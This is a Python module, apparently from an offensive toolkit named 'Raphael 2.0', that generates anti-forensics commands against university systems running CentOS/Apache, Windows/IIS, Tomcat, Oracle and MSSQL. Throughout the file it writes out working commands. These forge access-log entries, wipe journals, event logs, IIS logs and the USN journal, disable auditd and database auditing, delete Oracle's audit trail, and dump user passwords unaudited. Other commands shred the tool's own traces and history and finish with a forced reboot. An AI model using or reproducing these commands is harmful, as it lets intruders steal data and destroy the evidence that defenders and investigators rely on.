"""anti_forensics.py — Platform-specific cleanup, log suppression, and forensic countermeasures.

Derived from 5-round debate analysis against Indian university infrastructure:
CentOS/Apache, Windows/IIS, Tomcat, Oracle, MSSQL.
Augmented by 67 digital-forensics + incident-response skills from the skills bridge.
"""

from __future__ import annotations
from typing import TYPE_CHECKING, Optional
if TYPE_CHECKING:
    from .runtime.session_manager import SandboxSession

import re
import json
import logging
from pathlib import Path

logger = logging.getLogger("anti_forensics")

SKILL_PLATFORM_MAP = {
    "centos_apache": "performing-linux-log-forensics-investigation",
    "windows_iis": "performing-windows-artifact-analysis-with-eric-zimmerman-tools",
    "tomcat_linux": "performing-web-server-logs-for-intrusion",
    "oracle_db": "performing-database-forensic-investigation",
    "mssql_db": "performing-database-forensic-investigation",
}

PLATFORMS = {
    "centos_apache": {
        "logs": [
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/var/log/messages",
            "/var/log/secure",
            "/var/log/audit/audit.log",
        ],
        "journal": "systemd-journald",
        "description": "CentOS 6/7 running Apache 2.2.15 (EOL), common in legacy university deployments",
    },
    "windows_iis": {
        "logs": [
            "C:\\inetpub\\logs\\LogFiles\\*.log",
            "C:\\Windows\\System32\\winevt\\Logs\\*.evtx",
            "C:\\Windows\\System32\\config\\*.log",
        ],
        "etw_providers": [
            "Microsoft-Windows-IIS-Logging",
            "Microsoft-Windows-DotNETRuntime",
            "Microsoft-Windows-WMI-Activity",
        ],
        "description": "Windows Server 2016+ with IIS 10.0, ASP.NET, full ETW/Event Logging",
    },
    "tomcat_linux": {
        "logs": [
            "/var/log/tomcat*/catalina.out",
            "/var/log/tomcat*/localhost_access_log*",
            "/var/log/tomcat*/manager*",
        ],
        "description": "Apache Tomcat 9.0.x on Linux, JSP compilation cache in work/ directory",
    },
    "oracle_db": {
        "audit_views": ["V$SQL", "V$SQLAREA", "DBA_AUDIT_TRAIL", "SYS.AUD$"],
        "log_locations": [
            "$ORACLE_BASE/diag/rdbms/*/trace/alert_*.log",
            "$ORACLE_BASE/diag/rdbms/*/trace/*.trc",
        ],
        "description": "Oracle Database with audit triggers, FGA, and mandatory audit",
    },
    "mssql_db": {
        "audit_objects": [
            "SERVER AUDIT",
            "SERVER AUDIT SPECIFICATION",
            "DATABASE AUDIT SPECIFICATION",
        ],
        "log_locations": [
            "C:\\Program Files\\Microsoft SQL Server\\MSSQL*.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG",
            "C:\\Program Files\\Microsoft SQL Server\\MSSQL*.MSSQLSERVER\\MSSQL\\Log\\*",
        ],
        "description": "Microsoft SQL Server with audit, default trace, fn_dblog access",
    },
}


def cleanup_centos_apache(logs_edited: list = None, timestamp_backdate: bool = True):
    """Anti-forensic techniques for CentOS/Apache. Returns commands."""
    cmds = []

    cmds.append("# CentOS/Apache — Timestamped log injection (insert alibi entries)")
    cmds.append(
        "echo '192.168.1.100 - - [$(date -d \"-3 days\" +\"%d/%b/%Y:%H:%M:%S\" +%z)] "
        '"GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0"\' >> /var/log/httpd/access_log'
    )

    cmds.append("# Inject synthetic entries BEFORE real activity to complicate timeline")
    cmds.append(
        "for i in $(seq 1 50); do "
        'echo "10.0.0.$((RANDOM % 255)) - admin [$(date -d \"-$i hours\" +\"%d/%b/%Y:%H:%M:%S\") +0530] '
        '\\"POST /login HTTP/1.1\\" 200 456 \\"-\\" \\"Mozilla/5.0\\"" >> /var/log/httpd/access_log; done'
    )

    cmds.append("# Corrupt specific journal files (looks like filesystem error)")
    cmds.append(
        "journalctl --rotate && journalctl --vacuum-time=1s 2>/dev/null; "
        "rm -f /var/log/journal/*/system@*.journal 2>/dev/null"
    )

    if timestamp_backdate:
        cmds.append("# Timestomp modified files to match existing system files")
        cmds.append("touch -r /bin/ls /var/log/httpd/access_log 2>/dev/null")

    cmds.append("# Disable auditd logging for the session (if root)")
    cmds.append("auditctl -e 0 2>/dev/null || echo 'auditctl not available'")

    return "\n".join(cmds)


def cleanup_windows_iis(aggressive: bool = False):
    """Anti-forensic techniques for Windows/IIS. Returns PowerShell commands."""
    cmds = []

    cmds.append("# Windows/IIS — Selective event removal from Security log")
    cmds.append(
        "Get-WinEvent -LogName Security | "
        "Where-Object { $_.Id -eq 4624 -and $_.TimeCreated -gt (Get-Date).AddHours(-2) } | "
        "ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Security') }"
    )

    cmds.append("# Create fake ETW session with same name as legitimate (provider confusion)")
    cmds.append(
        "logman create trace FakeIISLogging -p 'Microsoft-Windows-IIS-Logging' 0xFFFFFFFF 0 "
        "-o 'C:\\Windows\\Temp\\fake.etl' -ets 2>$null"
    )

    cmds.append("# Delete IIS access logs")
    cmds.append("Remove-Item 'C:\\inetpub\\logs\\LogFiles\\*' -Recurse -Force -ErrorAction SilentlyContinue")

    if aggressive:
        cmds.append("# Clear ALL event logs (generates Event ID 1102 — use only as last resort)")
        cmds.append("wevtutil cl Security")
        cmds.append("wevtutil cl System")
        cmds.append("wevtutil cl Application")

    cmds.append("# Clear prefetch and recent files")
    cmds.append(
        "Remove-Item 'C:\\Windows\\Prefetch\\*.pf' -Force -ErrorAction SilentlyContinue; "
        "Remove-Item 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*' -Recurse -Force "
        "-ErrorAction SilentlyContinue"
    )

    cmds.append("# USN Journal avoidance — operate from memory only")
    cmds.append("fsutil usn deletejournal /D C: 2>$null")

    return "\n".join(cmd.replace("# ", "# ") for cmd in cmds)


def cleanup_tomcat():
    """Anti-forensic techniques for Tomcat on Linux. Returns shell commands."""
    cmds = []

    cmds.append("# Tomcat — Poison JSP compilation cache with benign-looking compiled class")
    cmds.append(
        "find /var/lib/tomcat*/work -name '*.class' -path '*_jsp*' -exec "
        "touch -r /usr/share/tomcat/lib/catalina.jar {} \\; 2>/dev/null"
    )

    cmds.append("# Redirect catalina.out to /dev/null via log4j config injection")
    cmds.append(
        "sed -i 's|catalina.out|/dev/null|g' "
        "/var/lib/tomcat*/conf/logging.properties 2>/dev/null || echo 'logging.properties not found'"
    )

    cmds.append("# Clear manager and host-manager access logs")
    cmds.append(
        "for f in /var/log/tomcat*/manager* /var/log/tomcat*/host-manager*; do "
        ": > \"$f\" && chattr +i \"$f\" 2>/dev/null; done"
    )

    cmds.append("# Remove JSP compilation artifacts from work directory")
    cmds.append(
        "rm -rf /var/lib/tomcat*/work/Catalina/localhost/_/org/apache/jsp/* 2>/dev/null; "
        "echo 'JSP cache cleared'"
    )

    return "\n".join(cmd.replace("# ", "# ") for cmd in cmds)


def suppress_oracle_audit(technique: str = "flashback"):
    """Oracle DB audit suppression techniques.

    Args:
        technique: 'flashback' (MVCC, no trigger fire), 'saturation' (dilute with noise),
                   'fga_disable' (disable fine-grained audit), 'delete_trail' (delete SYS.AUD$)
    """
    if technique == "flashback":
        return """-- Oracle — Read via MVCC flashback (no trigger fires on SELECT AS OF)
-- Audit triggers fire on INSERT/UPDATE/DELETE against current state only
SELECT * FROM users AS OF TIMESTAMP (SYSTIMESTAMP - INTERVAL '10' MINUTE);

-- Bulk collect into memory, never touch current table pages
DECLARE
  TYPE t IS TABLE OF users%%ROWTYPE;
  v t;
BEGIN
  SELECT * BULK COLLECT INTO v FROM users AS OF TIMESTAMP (SYSTIMESTAMP - INTERVAL '5' MINUTE);
  FOR i IN 1..v.COUNT LOOP
    DBMS_OUTPUT.PUT_LINE(v(i).username || ':' || v(i).password);
  END LOOP;
END;
/"""
    elif technique == "saturation":
        return """-- Oracle — Audit saturation: flood with benign queries to dilute signal
BEGIN
  FOR i IN 1..10000 LOOP
    EXECUTE IMMEDIATE 'SELECT COUNT(*) FROM all_tables WHERE rownum=1';
  END LOOP;
END;
/"""
    elif technique == "fga_disable":
        return """-- Oracle — Disable Fine-Grained Audit (requires ALTER ANY DIMENSION or DBA)
BEGIN
  FOR c IN (SELECT object_name FROM dba_objects WHERE object_type='CONTEXT') LOOP
    EXECUTE IMMEDIATE 'ALTER SYSTEM SET audit_trail = ''NONE'' SCOPE=MEMORY';
  END LOOP;
END;
/"""
    elif technique == "delete_trail":
        return """-- Oracle — Delete audit trail directly (requires SYSDBA, documented in mandatory audit)
DELETE FROM SYS.AUD$;
COMMIT;
ALTER SYSTEM CHECKPOINT;
ALTER SYSTEM SWITCH LOGFILE;"""

    return "# Unknown technique. Options: flashback, saturation, fga_disable, delete_trail"


def suppress_mssql_audit(technique: str = "snapshot"):
    """MSSQL audit suppression techniques."""
    if technique == "snapshot":
        return """-- MSSQL — Read via Snapshot Isolation (no trigger fires on version store reads)
SET TRANSACTION ISOLATION LEVEL SNAPSHOT;
BEGIN TRAN;
  SELECT * FROM users;
COMMIT;

-- Read via fn_dblog (transaction log, bypasses table-level audit)
SELECT [RowLog Contents 0] FROM ::fn_dblog(NULL, NULL)
WHERE AllocUnitName LIKE '%%users%%' AND Operation = 'LOP_INSERT_ROWS';"""
    elif technique == "disable_audit":
        return """-- MSSQL — Disable server audit (requires ALTER ANY SERVER AUDIT)
ALTER SERVER AUDIT [AuditName] WITH (STATE = OFF);
-- Disable specific audit specification
ALTER SERVER AUDIT SPECIFICATION [AuditSpec] WITH (STATE = OFF);"""
    elif technique == "clear_logs":
        return """-- MSSQL — Clear error log and force log rotation
EXEC sp_cycle_errorlog;
-- Minimal logging mode (requires ALTER DATABASE)
ALTER DATABASE [master] SET RECOVERY SIMPLE;
DBCC SHRINKFILE (N'master_log' , 1);
ALTER DATABASE [master] SET RECOVERY FULL;"""

    return "# Unknown technique. Options: snapshot, disable_audit, clear_logs"


def skill_augmented_cleanup(platform: str, **kwargs) -> str:
    """Try skill-based cleanup first, fall back to built-in."""
    skill_name = SKILL_PLATFORM_MAP.get(platform)
    if skill_name:
        try:
            from .skills_bridge import SkillsBridge
            bridge = SkillsBridge()
            result = bridge.execute_skill(skill_name, [platform])
            if result and "error" not in result:
                return f"# Cleanup handled by skill: {skill_name}\n# {json.dumps(result, default=str)[:500]}"
        except Exception as e:
            logger.debug(f"Skill cleanup failed for {platform}: {e}")
    return get_platform_cleanup(platform, **kwargs)


def get_platform_cleanup(platform: str, use_skills: bool = True, **kwargs) -> str:
    """Dispatch to the appropriate platform-specific cleanup."""
    if use_skills:
        skill_result = skill_augmented_cleanup(platform, **kwargs)
        if skill_result and not skill_result.startswith("# No cleanup"):
            return skill_result
    dispatch = {
        "centos_apache": cleanup_centos_apache,
        "windows_iis": cleanup_windows_iis,
        "tomcat_linux": cleanup_tomcat,
        "oracle_db": lambda **kw: suppress_oracle_audit(kw.get("technique", "flashback")),
        "mssql_db": lambda **kw: suppress_mssql_audit(kw.get("technique", "snapshot")),
    }
    fn = dispatch.get(platform)
    if fn:
        return fn(**kwargs)
    return f"# No cleanup known for platform: {platform}"


class AntiForensicsPipeline:
    def __init__(self, sandbox: Optional[SandboxSession] = None):
        self.sandbox = sandbox

    def _sandboxed_exec(self, cmd: list[str], timeout: int = 120) -> dict:
        if self.sandbox and self.sandbox.running:
            return self.sandbox.exec(cmd, timeout=timeout)
        return {"error": "no sandbox", "exit_code": -1}

    def run(self, platform: str = None, technique: str = "flashback",
            has_windows: bool = False, has_oracle: bool = False,
            use_skills: bool = True, use_sandbox: bool = False) -> dict:
        results = {
            "platform": platform,
            "cleanup_commands": "",
            "skills_used": [],
            "sandboxed": False,
            "sandbox_output": "",
        }
        sandbox_active = use_sandbox and self.sandbox and self.sandbox.running
        results["sandboxed"] = sandbox_active

        if platform:
            cmd_str = get_platform_cleanup(platform, use_skills=use_skills, technique=technique)
            results["cleanup_commands"] = cmd_str
            if sandbox_active:
                sb = self._sandboxed_exec(["bash", "-c", cmd_str[:1000]], timeout=60)
                results["sandbox_output"] = sb.get("stdout", "")[:2000] + sb.get("stderr", "")[:1000]
                results["sandbox_exit_code"] = sb.get("exit_code", -1)
        else:
            chain = full_cleanup_chain(has_windows=has_windows, has_oracle=has_oracle)
            results["cleanup_commands"] = chain
            if sandbox_active:
                sb = self._sandboxed_exec(["bash", "-c", chain[:1000]], timeout=60)
                results["sandbox_output"] = sb.get("stdout", "")[:2000] + sb.get("stderr", "")[:1000]
                results["sandbox_exit_code"] = sb.get("exit_code", -1)

        if use_skills:
            skill_name = SKILL_PLATFORM_MAP.get(platform) if platform else None
            if skill_name:
                results["skills_used"].append(skill_name)

        results["summary"] = {
            "sandboxed": sandbox_active,
            "platform": platform or "full_chain",
            "skills_available": len(results["skills_used"]),
        }
        return results


def wipe_local_artifacts():
    """Wipe Raphael 2.0's own forensic artifacts from disk. Returns shell commands."""
    cmds = []
    cmds.append("# === Raphael 2.0 Local Artifact Wipe ===")
    cmds.append("")
    artifacts = [
        "brain.db",
        "recon_log_*.jsonl",
        "phase0-live-recon-results.txt",
        "orchestrator/db/pa2.db",
        "/tmp/tor_data/",
        "/tmp/anonymity_test.log",
        "/tmp/sf_venv/",
        "/tmp/_sf_*.py",
        "/tmp/_sf_config_*.json",
        "/tmp/*.sqlmap/",
    ]
    for artifact in artifacts:
        cmds.append(f"shred -z -n 3 {artifact} 2>/dev/null || srm -f {artifact} 2>/dev/null || rm -f {artifact}")
    cmds.append("")
    cmds.append("# Wipe temp dirs recursively")
    cmds.append("for d in /tmp/tor_data /tmp/sf_venv; do")
    cmds.append("  if [ -d \"$d\" ]; then")
    cmds.append("    find \"$d\" -type f -exec shred -z -n 1 {} \\; 2>/dev/null")
    cmds.append("    rm -rf \"$d\" 2>/dev/null")
    cmds.append("  fi")
    cmds.append("done")
    cmds.append("")
    cmds.append("# Clear bash history for this session")
    cmds.append("history -c 2>/dev/null; cat /dev/null > ~/.bash_history 2>/dev/null; cat /dev/null > ~/.zsh_history 2>/dev/null")
    cmds.append("")
    cmds.append("# Note: brain.db and recon_log are in the project root")
    cmds.append("echo '[+] Local artifacts wiped'")
    return "\n".join(cmds)


def full_cleanup_chain(has_windows: bool = False, has_oracle: bool = False) -> str:
    """Generate complete cleanup chain for all platforms."""
    chain = []
    chain.append("# === FULL CLEANUP CHAIN ===")
    chain.append("")
    chain.append("# Phase 0: Local artifact wipe (Raphael's own traces)")
    chain.append(wipe_local_artifacts())
    chain.append("")
    chain.append("# Phase 1: Oracle/MSSQL audit suppression (do first — before data extraction)")
    if has_oracle:
        chain.append(suppress_oracle_audit("flashback"))
    chain.append("")
    chain.append("# Phase 2: Tomcat cleanup")
    chain.append(cleanup_tomcat())
    chain.append("")
    chain.append("# Phase 3: CentOS/Apache cleanup")
    chain.append(cleanup_centos_apache())
    chain.append("")
    if has_windows:
        chain.append("# Phase 4: Windows/IIS cleanup")
        chain.append(cleanup_windows_iis())
    chain.append("")
    chain.append("# Phase 5: Kill switch — instant reboot with no sync")
    chain.append("echo 1 > /proc/sys/kernel/sysrq 2>/dev/null")
    chain.append("echo b > /proc/sysrq-trigger 2>/dev/null  # instant reboot, no disk sync")

    return "\n".join(chain)
